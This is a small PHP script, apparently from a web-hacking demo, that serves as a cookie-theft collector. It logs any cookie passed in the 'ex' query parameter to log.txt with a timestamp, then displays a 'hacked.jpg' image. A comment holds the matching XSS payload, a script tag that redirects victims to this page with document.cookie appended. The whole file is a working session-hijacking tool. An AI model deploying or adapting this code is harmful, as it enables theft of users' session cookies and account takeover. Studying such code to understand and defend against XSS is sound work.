<?php 
$cookies = "*****************************\ncookie: ".$_GET["ex"]."\n";
$time = time();
date_default_timezone_set('Asia/Ho_Chi_Minh');
$date ="saved at: " . date("d/m/Y - H:i:s") ."\n*****************************";

$file = fopen('log.txt', 'a');
fwrite($file, $cookies . $date."\n\n");
//header('Location: https://google.com.vn');
//<script>document.location="http://localhost/webdemo/test.php?ex="+document.cookie;</script>
 ?>
 <img style =" display: block; margin-left: auto; margin-right: auto;"src="hacked.jpg">
